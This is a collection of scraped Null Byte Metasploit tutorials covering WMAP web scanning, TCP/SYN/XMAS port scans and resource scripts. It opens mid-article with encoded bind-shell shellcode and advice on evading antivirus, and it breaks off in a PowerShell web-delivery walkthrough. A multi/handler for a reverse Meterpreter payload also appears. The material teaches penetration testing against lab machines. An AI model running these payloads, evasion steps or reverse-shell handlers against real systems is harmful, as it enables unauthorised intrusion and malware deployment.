0xf2,\n(byte) 0x8b, (byte) 0x9d, (byte) 0x1a, (byte) 0x4b, (byte) 0x9f, (byte) 0xdc, (byte) 0x96, (byte) 0x69,\n(byte) 0x74, (byte) 0xfc, (byte) 0x4f, (byte) 0x18, (byte) 0x72, (byte) 0x35, (byte) 0x88, (byte) 0x71,\n(byte) 0x46, (byte) 0x31, (byte) 0x5d, (byte) 0x9b, (byte) 0x44, (byte) 0x34, (byte) 0x46, (byte) 0xec,\n(byte) 0x1e, (byte) 0xdd, (byte) 0x8e, (byte) 0xf9, (byte) 0xb3, (byte) 0xe0, (byte) 0x51, (byte) 0x4e,\n(byte) 0xb8, (byte) 0xee, (byte) 0x7b, (byte) 0x29, (byte) 0x1e\nOption 7: Save as File\nFinally, we have the option to save the generated payload to a file instead of having it displayed directly on the screen. Use the -f flag followed by the file path — in this case, the file titled \"payload\" is being saved right in the home directory.\nmsf payload(linux/x86/shell_bind_tcp) > generate -b '\\x00\\xa1\\x66\\x81' -i 5 -o lport=1234 -t java -f payload\n[*] Writing 3183 bytes to payload...\nWill This Really Bypass Antivirus Tools?\nVirus Total is an online tool used to examine suspicious files to determine if they are malicious or not. It combines many antivirus products and tests uploaded files for known signatures in the database. We can see that the sample payload we created comes back clean for most antivirus software.\nPlease note that uploading a file to Virus Total will add it to the database, so don't upload anything that you don't want to be detected in the future. Feel free to play around with all the different options that the generate command has to offer, and have fun creating a totally unrecognizable payload.\nClosing Thoughts\nMetasploit makes it easy to generate custom shellcode from within msfconsole, in an effort to obfuscate payloads and evade antivirus detection. The generate command has a slew of options available, ranging from the ability to restrict certain characters to encoding the payload with multiple iterations. Most of these options can be combined to create a payload that has a decent chance at bypassing antivirus software — a goal that should be on the mind of any would-be hacker.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Use Metasploit's WMAP Module to Scan Web Applications for Common Vulnerabilities",
        "link": "https://null-byte.wonderhowto.com/how-to/use-metasploits-wmap-module-scan-web-applications-for-common-vulnerabilities-0187572/",
        "content": "* WonderHowTo\nHaving an efficient workflow is an integral part of any craft, but it's especially important when it comes to probing apps for vulnerabilities. While Metasploit is considered the de facto standard when it comes to exploitation, it also contains modules for other activities, such as scanning. Case in point, WMAP, a web application scanner available for use from within the Metasploit framework.\nA web application scanner is a tool used to identify vulnerabilities that are present in web applications. WMAP makes it easy to retain a smooth workflow since it can be loaded and run while working inside Metasploit. This guide will feature DVWA (Damn Vulnerable Web Application) as the target and Kali Linux and Metasploit on the offensive.\n* Don't Miss: Scan Websites for Potential Vulnerabilities Using Vega in Kali\nStep 1: Set Up Metasploit Database\nThe first thing we need to do, if it's not done already, is set up the Metasploit database, since this particular module needs it in order to run. Metasploit utilizes a PostgreSQL database system, making it extremely useful to keep track of large amounts of information when conducting penetration tests. This allows for the import and export of scan results from other tools, as well as storage of discovered credentials, services, and other valuable data.\nWe can initialize the database with the msfdb init command in the terminal. This will create a default database and user for Metasploit to interact with.\n[+] Starting database\n[+] Creating database user 'msf'\n[+] Creating databases 'msf'\n[+] Creating databases 'msf_test'\n[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'\n[+] Creating initial database schema\nNext, start the PostgreSQL service with service postgresql start.\nservice postgresql start\nNow we can fire up Metasploit by typing msfconsole.\nFinally, we can check that database is loaded and working properly by using the db_status command:\nmsf > db_status\n[*] postgresql connected to msf\nStep 2: Load WMAP\nIt's easy to load the WMAP module with the load wmap command.\nmsf > load wmap\n.-.-.-..-.-.-..---..---.\n| | | || | | || | || |-'\n`-----'`-'-'-'`-^-'`-'\n[WMAP 1.5.1] ===  et [  ] metasploit.com 2012\n[*] Successfully loaded plugin: wmap\nFrom here, if we type ? to display Metasploit's help menu, we should see the commands for WMAP and their descriptions at the top of the menu.\nwmap Commands\n=============\nCommand       Description\n-------       -----------\nwmap_modules  Manage wmap modules\nwmap_nodes    Manage nodes\nwmap_run      Test targets\nwmap_sites    Manage sites\nwmap_targets  Manage targets\nwmap_vulns    Display web vulns\nStep 3: Add Site to Scan\nType any of the commands to display their available options; Let's start by managing sites we wish to scan using wmap_sites.\nmsf > wmap_sites\n[*] Usage: wmap_sites [options]\n-h        Display this help text\n-a [url]  Add site (vhost,url)\n-d [ids]  Delete sites (separate ids with space)\n-l        List all available sites\n-s [id]   Display site structure (vhost,url|ids) (level) (unicode output true/false)\nTo add a site, use wmap_sites with the -a flag followed by the site address.\nmsf > wmap_sites -a http://172.16.1.102\n[*] Site created.\nNow we can list the available sites using wmap_sites with the -l flag.\nmsf > wmap_sites -l\n[*] Available sites\n===============\nId  Host          Vhost         Port  Proto  # Pages  # Forms\n--  ----          -----         ----  -----  -------  -------\n0   172.16.1.102  172.16.1.102  80    http   0        0\nStep 4: Specify Target URL\nNext, we need to set the specific target URL we want to scan using wmap_targets.\nmsf > wmap_targets\n[*] Usage: wmap_targets [options]\n-h \t\tDisplay this help text\n-t [urls]\tDefine target sites (vhost1,url[space]vhost2,url)\n-d [ids]\tDefine target sites (id1, id2, id3 ...)\n-c \t\tClean target sites list\n-l  \t\tList all target sites\nWe can define the target using wmap_targets with the -t flag, followed by the URL.\nmsf > wmap_targets -t http://172.16.1.102/dvwa/index.php\nAnd use wmap_targets with the -l flag to list the defined targets.\nmsf > wmap_targets -l\n[*] Defined targets\n===============\nId  Vhost         Host          Port  SSL    Path\n--  -----         ----          ----  ---    ----\n0   172.16.1.102  172.16.1.102  80    false  \t/dvwa/index.php\nWe should be good to go at this point, so the only thing left to do is to actually run the scanner.\nStep 5: Run Scanner\nType wmap_run at the prompt to view the options for this command.\nmsf > wmap_run\n[*] Usage: wmap_run [options]\n-h                        Display this help text\n-t                        Show all enabled modules\n-m [regex]                Launch only modules that name match provided regex.\n-p [regex]                Only test path defined by regex.\n-e [/path/to/profile]     Launch profile modules against all matched targets.\n(No profile file runs all enabled modules.)\nWe can use wmap_run with the -t flag to list all the enabled modules before we scan the target.\nmsf > wmap_run -t\n[*] Testing target:\n[*] \tSite: 172.16.1.102 (172.16.1.102)\n[*] \tPort: 80 SSL: false\n============================================================\n[*] Testing started. 2018-09-20 10:23:26 -0500\n[*] Loading wmap modules...\n[*] 39 wmap enabled modules loaded.\n=[ SSL testing ]=\n============================================================\n[*] Target is not SSL. SSL modules disabled.\n=[ Web Server testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/http_version\n[*] Module auxiliary/scanner/http/open_proxy\n[*] Module auxiliary/admin/http/tomcat_administration\n[*] Module auxiliary/admin/http/tomcat_utf8_traversal\n[*] Module auxiliary/scanner/http/drupal_views_user_enum\n[*] Module auxiliary/scanner/http/frontpage_login\n[*] Module auxiliary/scanner/http/host_header_injection\n[*] Module auxiliary/scanner/http/options\n[*] Module auxiliary/scanner/http/robots_txt\n[*] Module auxiliary/scanner/http/scraper\n[*] Module auxiliary/scanner/http/svn_scanner\n[*] Module auxiliary/scanner/http/trace\n[*] Module auxiliary/scanner/http/vhost_scanner\n[*] Module auxiliary/scanner/http/webdav_internal_ip\n[*] Module auxiliary/scanner/http/webdav_scanner\n[*] Module auxiliary/scanner/http/webdav_website_content\n=[ File/Dir testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/backup_file\n[*] Module auxiliary/scanner/http/brute_dirs\n[*] Module auxiliary/scanner/http/copy_of_file\n[*] Module auxiliary/scanner/http/dir_listing\n[*] Module auxiliary/scanner/http/dir_scanner\n[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass\n[*] Module auxiliary/scanner/http/file_same_name_dir\n[*] Module auxiliary/scanner/http/files_dir\n[*] Module auxiliary/scanner/http/http_put\n[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass\n[*] Module auxiliary/scanner/http/prev_dir_same_name_file\n[*] Module auxiliary/scanner/http/replace_ext\n[*] Module auxiliary/scanner/http/soap_xml\n[*] Module auxiliary/scanner/http/trace_axd\n[*] Module auxiliary/scanner/http/verb_auth_bypass\n=[ Unique Query testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/blind_sql_query\n[*] Module auxiliary/scanner/http/error_sql_injection\n[*] Module auxiliary/scanner/http/http_traversal\n[*] Module auxiliary/scanner/http/rails_mass_assignment\n[*] Module exploit/multi/http/lcms_php_exec\n=[ Query testing ]=\n============================================================\n=[ General testing ]=\n============================================================\nThere are a few different categories of modules including ones for directory testing, query testing, web server testing, and SSL testing, although we can see that our target doesn't employ SSL, so these modules are disabled. To get a detailed description of any given module, use the info command followed by the full path of the module that's listed. For example:\nmsf > info auxiliary/scanner/http/http_version\nName: HTTP Version Detection\nModule: auxiliary/scanner/http/http_version\nLicense: Metasploit Framework License (BSD)\nRank: Normal\nProvided by:\nhdm <x@hdm.io>\nBasic options:\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nProxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS                    yes       The target address range or CIDR identifier\nRPORT    80               yes       The target port (TCP)\nSSL      false            no        Negotiate SSL/TLS for outgoing connections\nTHREADS  1                yes       The number of concurrent threads\nVHOST                     no        HTTP server virtual host\nDescription:\nDisplay version information about each system.\nBack to scanning. Let's begin the scan by using wmap_run with the -e flag, which will run all of the modules instead of just a specified one. Depending on the target site and the number of enabled modules, the scan can take quite some time to finish. Once it's done, the scan will show how long it took to complete.\nmsf > wmap_run -e\n[*] Using ALL wmap enabled modules.\n[-] NO WMAP NODES DEFINED. Executing local modules\n[*] Testing target:\n[*] \tSite: 172.16.1.102 (172.16.1.102)\n[*] \tPort: 80 SSL: false\n============================================================\n[*] Testing started. 2018-09-20 10:24:33 -0500\n=[ SSL testing ]=\n============================================================\n[*] Target is not SSL. SSL modules disabled.\n=[ Web Server testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/http_version\n[+] 172.16.1.102:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.24 )\n[*] Module auxiliary/scanner/http/open_proxy\n[*] Module auxiliary/admin/http/tomcat_administration\n[*] Module auxiliary/admin/http/tomcat_utf8_traversal\n=[ Unique Query testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/blind_sql_query\n[*] Module auxiliary/scanner/http/error_sql_injection\n[*] Module auxiliary/scanner/http/http_traversal\n[*] Module auxiliary/scanner/http/rails_mass_assignment\n[*] Module exploit/multi/http/lcms_php_exec\n=[ Query testing ]=\n============================================================\n=[ General testing ]=\n============================================================\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nLaunch completed in 337.37769508361816 seconds.\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nStep 6: Interpret Results\nFinally, we can type the wmap_vulns -l command to display the results of the scan.\nmsf > wmap_vulns -l\n[*] + [172.16.1.102] (172.16.1.102): scraper /\n[*] \tscraper Scraper\n[*] \tGET Metasploitable2 - Linux\n[*] + [172.16.1.102] (172.16.1.102): directory /dav/\n[*] \tdirectory Directory found.\n[*] \tGET Res code: 200\n[*] + [172.16.1.102] (172.16.1.102): directory /cgi-bin/\n[*] \tdirectory Directoy found.\n[*] \tGET Res code: 403\n[*] + [172.16.1.102] (172.16.1.102): directory /doc/\n[*] \tdirectory Directoy found.\n[*] \tGET Res code: 200\n[*] + [172.16.1.102] (172.16.1.102): directory /icons/\n[*] \tdirectory Directoy found.\n[*] \tGET Res code: 200\n[*] + [172.16.1.102] (172.16.1.102): directory /index/\n[*] \tdirectory Directoy found.\n[*] \tGET Res code: 200\n[*] + [172.16.1.102] (172.16.1.102): directory /phpMyAdmin/\n[*] \tdirectory Directoy found.\n[*] \tGET Res code: 200\nWe can see it found some potentially interesting directories that could be worth investigating further:\n* The /cgi-bin/ directory allows scripts to be executed and perform console-like functions directly on the server.\n* The /phpMyAdmin/ directory is an open-source administration tool for MySQL database systems.\n* The /dav/ directory allows users to collaborate and perform web authoring activities remotely.\nWMAP might not return as detailed results as other web application vulnerability scanners, but this information can be a useful jumping off point to explore different avenues of attack. The fact that this scanner can be easily loaded and utilized from within the Metasploit Framework makes it a useful tool to know how to use.\nWrapping Up\nMetasploit is a powerful tool which can not only be used for exploitation but also features tons of other modules that can be loaded and ran from directly within the framework, making it an absolute powerhouse when it comes to penetration testing and ethical hacking.\nIn this tutorial, we learned how to quickly get Metasploit's database system up and running, as well as how to use the WMAP plugin to scan a web application for vulnerabilities. This is just one of many incredibly useful modules available as part of the Metasploit Framework, with more being written each day to satisfy the needs of white hats everywhere.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Discover Open Ports Using Metasploit's Built-in Port Scanner",
        "link": "https://null-byte.wonderhowto.com/how-to/discover-open-ports-using-metasploits-built-port-scanner-0186829/",
        "content": "* WonderHowTo\nOne of the first steps in reconnaissance is determining the open ports on a system. Nmap is widely considered the undisputed king of port scanning, but certain situations call for different tools. Metasploit makes it easy to conduct port scanning from directly inside the framework, and we'll show you three types of port scans: TCP, SYN, and XMAS.\nWhat Is Port Scanning?\nPort scanning is the process of probing a range of ports in order to determine the state of those ports — generally open or closed. There are 65,536 available ports on a host, with the first 1,024 ports being reserved for well-known services. Ports can communicate using the TCP protocol, UDP, or both.\n* Don't Miss: The Ultimate List of Hacking Scripts for Metasploit's Meterpreter\nThe first type of scan we will be covering is the TCP scan, also known as TCP connect. This type of scan utilizes a system call to establish a connection, much like web browsers or other networked applications. When a port is open, the TCP scan will initiate and complete a full three-way handshake, and then close the connection. This type of scan is effective, but noisy since the IP address can be logged.\nThe second type of scan is the SYN scan. This is the default Nmap scan and is considered the most popular type of port scan. In contrast to the TCP connect scan, an SYN scan uses raw packets to connect to ports rather than a system call. This is advantageous because the connection is never fully completed, making it relatively stealthy and more likely to evade firewalls. There is also more control over the requests and responses since there is access to raw networking.\nThe third type of scan we will be going over is the XMAS scan. This scan sets the FIN, PSH, and URG flags on the packet, which is said to light it up like a Christmas tree (hence the name). XMAS scans can be even stealthier than SYN scans, although modern intrusion detection systems can still detect them. Regardless, it is worth trying out if other scanning methods fail.\nOption 1: TCP Scan\nThe first thing we need to to before conducting any scans is start Metasploit by typing msfconsole in the terminal. A random banner will be displayed, as well as version information and the number of modules currently loaded.\n,           ,\n/             \\\n((__---,,,---__))\n(_) O O (_)_________\n\\ _ /            |\\\no_o \\   M S F   | \\\n\\   _____  |  *\n|||   WW|||\n|||     |||\n=[ metasploit v4.17.8-dev                          ]\n+ -- --=[ 1803 exploits - 1027 auxiliary - 311 post       ]\n+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\nScanners are a type of auxiliary module in Metasploit, and to locate the port scanners, we can type search portscan at the prompt.\nmsf > search portscan\n[!] Module database cache not built yet, using slow search\nMatching Modules\n================\nName                                              Disclosure Date  Rank    Description\n----                                              ---------------  ----    -----------\nauxiliary/scanner/http/wordpress_pingback_access                   normal  Wordpress Pingback Locator\nauxiliary/scanner/natpmp/natpmp_portscan                           normal  NAT-PMP External Port Scanner\nauxiliary/scanner/portscan/ack                                     normal  TCP ACK Firewall Scanner\nauxiliary/scanner/portscan/ftpbounce                               normal  FTP Bounce Port Scanner\nauxiliary/scanner/portscan/syn                                     normal  TCP SYN Port Scanner\nauxiliary/scanner/portscan/tcp                                     normal  TCP Port Scanner\nauxiliary/scanner/portscan/xmas                                    normal  TCP \"XMas\" Port Scanner\nauxiliary/scanner/sap/sap_router_portscanner                       normal  SAPRouter Port Scanner\nThis returns a few results, including the three types of port scans we will be looking at. Let's start with a simple TCP scan. Type use auxiliary/scanner/portscan/tcp to load the module. We can now take a look at the module settings by typing options:\nmsf auxiliary(scanner/portscan/tcp) > options\nModule options (auxiliary/scanner/portscan/tcp):\nName         Current Setting  Required  Description\n----         ---------------  --------  -----------\nCONCURRENCY  10               yes       The number of concurrent ports to check per host\nDELAY        0                yes       The delay between connections, per thread, in milliseconds\nJITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\nPORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\nRHOSTS                        yes       The target address range or CIDR identifier\nTHREADS      1                yes       The number of concurrent threads\nTIMEOUT      1000             yes       The socket connect timeout in milliseconds\nHere, we can the current settings and their descriptions. Unlike many exploit modules, this scanner can take a range of target addresses in addition to a single IP address. In this case, since we only have one target machine, a single address will do.\nThe number of threads can also be increased to help the scan run faster. It's recommended to keep this value under 256 for Unix systems and under 16 for native Win32 systems. To be safe, we can set this to something like 8. All the other options can be left as default for now.\nmsf auxiliary(scanner/portscan/tcp) > set rhosts 172.16.1.102\nrhosts => 172.16.1.102\nmsf auxiliary(scanner/portscan/tcp) > set threads 8\nthreads => 8\nNow we're ready to start the scan. In Metasploit, the run command is simply an alias for exploit, so it will do the exact same thing. Given we are only conducting scans, run seems more appropriate, though it really doesn't matter.\nmsf auxiliary(scanner/portscan/tcp) > run\n[+] 172.16.1.102:         - 172.16.1.102:21 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:23 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:22 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:25 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:53 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:80 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:111 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:139 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:445 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:513 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:514 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:512 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:1099 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:1524 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:2049 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:2121 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:3306 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:3632 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:5432 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:5900 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:6000 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:6667 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:6697 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:8009 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:8180 - TCP OPEN\n[+] 172.16.1.102:         - 172.16.1.102:8787 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nThe TCP scan will run pretty quickly, and once it's complete, we can see that there are many open ports on the target.\nOption 2: SYN Scan\nNext, we'll move on to a SYN scan. Type back to return to the main prompt, followed by use auxiliary/scanner/portscan/syn to load the module. Again, we can type options to view the current settings for this module:\nmsf auxiliary(scanner/portscan/syn) > options\nModule options (auxiliary/scanner/portscan/syn):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nBATCHSIZE  256              yes       The number of hosts to scan per set\nDELAY      0                yes       The delay between connections, per thread, in milliseconds\nINTERFACE                   no        The name of the interface\nJITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\nPORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\nRHOSTS                      yes       The target address range or CIDR identifier\nSNAPLEN    65535            yes       The number of bytes to capture\nTHREADS    1                yes       The number of concurrent threads\nTIMEOUT    500              yes       The reply read timeout in milliseconds\nThere are a few different options here compared to the TCP scan, but for the most part, it's very similar, including the option to accept a range of target addresses and the number of threads to set.\nWhen performing a number of scans or exploits on a singular target, it can get tiring setting the same options over and over again. Luckily, there is a command that will set an option globally, meaning it won't have to be re-entered when using a different module. Use setg to set a global option.\nmsf auxiliary(scanner/portscan/syn) > setg rhosts 172.16.1.102\nrhosts => 172.16.1.102\nmsf auxiliary(scanner/portscan/syn) > setg threads 8\nthreads => 8\nNow, type run to start the scan.\nmsf auxiliary(scanner/portscan/syn) > run\n[+]  TCP OPEN 172.16.1.102:21\n[+]  TCP OPEN 172.16.1.102:22\n[+]  TCP OPEN 172.16.1.102:23\n[+]  TCP OPEN 172.16.1.102:25\n[+]  TCP OPEN 172.16.1.102:53\n[+]  TCP OPEN 172.16.1.102:80\n[+]  TCP OPEN 172.16.1.102:111\n[+]  TCP OPEN 172.16.1.102:139\n[+]  TCP OPEN 172.16.1.102:445\n[+]  TCP OPEN 172.16.1.102:512\n[+]  TCP OPEN 172.16.1.102:513\n[+]  TCP OPEN 172.16.1.102:514\n[+]  TCP OPEN 172.16.1.102:1099\n[+]  TCP OPEN 172.16.1.102:1524\n[+]  TCP OPEN 172.16.1.102:2049\n[+]  TCP OPEN 172.16.1.102:2121\n[+]  TCP OPEN 172.16.1.102:3306\n[+]  TCP OPEN 172.16.1.102:3632\n[+]  TCP OPEN 172.16.1.102:5432\n[+]  TCP OPEN 172.16.1.102:5900\n[+]  TCP OPEN 172.16.1.102:6000\n[+]  TCP OPEN 172.16.1.102:6667\n[+]  TCP OPEN 172.16.1.102:6697\n[+]  TCP OPEN 172.16.1.102:8009\n[+]  TCP OPEN 172.16.1.102:8180\n[+]  TCP OPEN 172.16.1.102:8787\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nThe SYN scan will take a little longer to complete compared to the TCP scan, but once it's done, we can see that we obtained similar results compared to the previous scan.\nOption 3: XMAS Scan\nThe third type of scan we'll do is the XMAS scan. Again, type back to exit the current module, and then use auxiliary/scanner/portscan/xmas to load the module. Since we previously set global options for the remote host and threads, we should see these settings already populated when we view options now.\nmsf auxiliary(scanner/portscan/xmas) > options\nModule options (auxiliary/scanner/portscan/xmas):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nBATCHSIZE  256              yes       The number of hosts to scan per set\nDELAY      0                yes       The delay between connections, per thread, in milliseconds\nINTERFACE                   no        The name of the interface\nJITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\nPORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\nRHOSTS     172.16.1.102     yes       The target address range or CIDR identifier\nSNAPLEN    65535            yes       The number of bytes to capture\nTHREADS    8                yes       The number of concurrent threads\nTIMEOUT    500              yes       The reply read timeout in milliseconds\nThe other options are pretty much identical to the SYN scan, so we can leave these as default. Feel free to play around with the other settings and see how it affects the timing and accuracy. Now we can run the scan.\nmsf auxiliary(scanner/portscan/xmas) > run\n[*]  TCP OPEN|FILTERED 172.16.1.102:21\n[*]  TCP OPEN|FILTERED 172.16.1.102:22\n[*]  TCP OPEN|FILTERED 172.16.1.102:23\n[*]  TCP OPEN|FILTERED 172.16.1.102:25\n[*]  TCP OPEN|FILTERED 172.16.1.102:53\n[*]  TCP OPEN|FILTERED 172.16.1.102:80\n[*]  TCP OPEN|FILTERED 172.16.1.102:111\n[*]  TCP OPEN|FILTERED 172.16.1.102:139\n[*]  TCP OPEN|FILTERED 172.16.1.102:445\n[*]  TCP OPEN|FILTERED 172.16.1.102:512\n[*]  TCP OPEN|FILTERED 172.16.1.102:513\n[*]  TCP OPEN|FILTERED 172.16.1.102:514\n[*]  TCP OPEN|FILTERED 172.16.1.102:1099\n[*]  TCP OPEN|FILTERED 172.16.1.102:1524\n[*]  TCP OPEN|FILTERED 172.16.1.102:2049\n[*]  TCP OPEN|FILTERED 172.16.1.102:2121\n[*]  TCP OPEN|FILTERED 172.16.1.102:3306\n[*]  TCP OPEN|FILTERED 172.16.1.102:3632\n[*]  TCP OPEN|FILTERED 172.16.1.102:5432\n[*]  TCP OPEN|FILTERED 172.16.1.102:5900\n[*]  TCP OPEN|FILTERED 172.16.1.102:6000\n[*]  TCP OPEN|FILTERED 172.16.1.102:6667\n[*]  TCP OPEN|FILTERED 172.16.1.102:6697\n[*]  TCP OPEN|FILTERED 172.16.1.102:8009\n[*]  TCP OPEN|FILTERED 172.16.1.102:8180\n[*]  TCP OPEN|FILTERED 172.16.1.102:8787\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nOnce again, we obtained similar results to the other scans, with additional information about whether the port is filtered or not. Depending on the target (or targets) and the type of environment in place, these scans can sometimes yield different results, so it certainly doesn't hurt to try out multiple scans.\nThese Find Open Ports with Ease\nIn this guide, we've covered how to do three types of port scan — TCP, SYN, and XMAS — right from Metasploit's interactive console. These scanners are quick and dirty, but can accomplish the objective of finding open ports with relative ease. This just goes to show that Metasploit is packed full of features that make it easier for white hat hackers to do what they best.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 14 (Creating Resource Script Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-14-creating-resource-script-files-0169962/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nIn this series, I have been trying to familiarize you with the many features of the world's best framework for exploitation, hacking, and pentesting, Metasploit. There are so many features, and techniques for using those features, that few pentesters/hackers are aware of all of them.\nMany times, when doing a pentest/hack, we need to run a number of Metasploit commands repeatedly. These commands may be exactly the same each time, and just like scripting, we may need to automatically run multiple Metasploit commands in a single step. Metasploit has the capability to save and store these \"scripts,\" and they can then be recalled by the script name. Metasploit calls these scripts resource files.\nFor example, in many attacks, we need to set up a multi/handler to connect to when a payload is executed on a target system. In my new Powersploit series, or with the web delivery Metasploit module, we will always need to set a multi/handler to receive the connections from a sent payload. This usually involves several commands: using the multi/handler, setting the port, setting the payload, setting the IP, an so on. To make things easier, we can store all of these commands in a resource file and simply run a single command to execute all of them.\nNow that you have a better idea of when these would be useful, let's take a look at Metasploit's scripting capabilities with resource files.\nStep 1: Exploring Resource Scripts in Metasploit\nFirst, let's take a look at where Metasploit store its scripts. Let's navigate to /usr/share/metasploit-framework/scripts/resources, and then do a long listing.\nkali > cd /usr/share/metasploit-framework/scripts/resourcekali > ls -l\nAs you can see, Metasploit has numerous scripts already developed and stored here. Any new script that we write will be stored here as well.\nStep 2: Writing Our Own Resource Script\nNow let's create our own simple script to start a multi/handler necessary to receive connections, such as we used in the first Powersploit tutorial. First, start Metasploit, then enter the commands we want in our script.\nkali > msfconsolemsf > use exploit/multi/handlermsf > set PAYLOAD windows/meterpreter/reverse_httpmsf > set LHOST 192.168.181.128msf > set LPORT 4444\nWhen we have completed all of the commands we want in the script, we simply use the keyword makerc followed by the name of the script. For instance, here I named the script, handler_http.rc (a multi/handler for HTTP followed by the Metasploit extension for resource files, rc).\nmsf > makerc handler_http.rc\nMetasploit now saves each of those commands into that script file.\nStep 3: Checking the Script Contents\nIf we want to see want commands are in a script file, we can use one of the many commands in Linux to display the contents of a file, such as cat, less, and more. Here, I used more followed by the resource file name.\nmsf > more handler_http.rc\nNotice that Metasploit now displays the commands in my script file, handler_http.rc.\nStep 4: Executing Our New Script File\nWhen we want to execute this script, we simply precede the script name with the keyword resource such as:\nmsf > resource handler_http.rc\nMetasploit will now run each of the commands in our script automatically. Now simply type exploit to start our handler.\nmsf > exploit\nStep 5: Checking Whether It Was Saved\nIf we go back to the location where the scripts are stored, we can see that our new script, handler_http.rc, is now stored with the other Metasploit prepackaged scripts.\nStep 6: Starting the Script Automatically with Metasploit\nIf we know before starting Metasploit that we will be using a particular script, we can have Metasploit automatically execute the script upon starting. We do this by starting Metasploit with the msfconsole command, the -r switch, and followed by the name of the resource file we want to execute upon opening, such as:\nkali > msfconsole -r handler_http.rc\nNow, when Metasploit starts, it will automatically execute the handler_http.rc script, and you are ready to go.\nKeep coming back, my budding hackers, as we explore the tools and techniques of the most important and valuable skill of the 21st century—hacking!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 13 (Web Delivery for Windows)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-13-web-delivery-for-windows-0169281/",
        "content": "* WonderHowTo\nWelcome back, my hacker novitiates!\nIn the previous part of this series, we looked at how to use Metasploit's web delivery exploit to create a script to connect to a UNIX, Linux, or OS X machine using Python. Many members of the Null Byte community have asked me, \"Can we do the same for a Windows systems?\" The answer is YES!\nAlthough the web delivery exploit will work on Windows systems that have Python installed, few Windows systems actually have Python installed while nearly ever UNIX, Linux, and OS X has Python installed by default. Fortunately, those Windows systems do have PowerShell installed by default, and we can use it with Metasploit's web delivery exploit to take control of those systems.\nIn this tutorial, we will use Metasploit's web delivery exploit to take control of a Windows system through its PowerShell.\nStep 1: Start Metasploit\nTo begin, fire up your Kali system, open a terminal, and start Metasploit.\nkali > msfconsole\nStep 2: Loading the Web Delivery Exploit\nLike already mentioned above, using Metasploit's web delivery is very similar to web delivery on Unix, Linux, and OS X systems except that Windows systems don't have Python installed by default. But they do have Windows PowerShell, and there is a web delivery module for that.\nLet's load the web delivery exploit in Metasploit:\nmsf > use exploit/multi/script/web_delivery\nNext, we need to set the LHOST and LPORT exactly like we did with the Unix/Linux/OS X web delivery exploit.\nmsf > set LHOST 192.1681.153\nmsf > set LPORT 4444\nNext, we need to set the URIPATH. This can be set to anything you please. I set it here to \"powersploit\", but you can set it to anything you like.\nmsf > set URIPATH powersploit\nStep 3: Set the Target to PowerShell\nBy default, the web delivery exploit in Metasploit uses Python scripts. To use the Windows-based PowerShell option, we need to set the target to 2.\nmsf > set target 2\nWith the target set to 2, Metasploit will create a PowerShell script when we are ready to exploit.\nStep 4: Set the Payload\nLastly, we need to set the payload. Let's use the windows/powershell_reverse_tcp 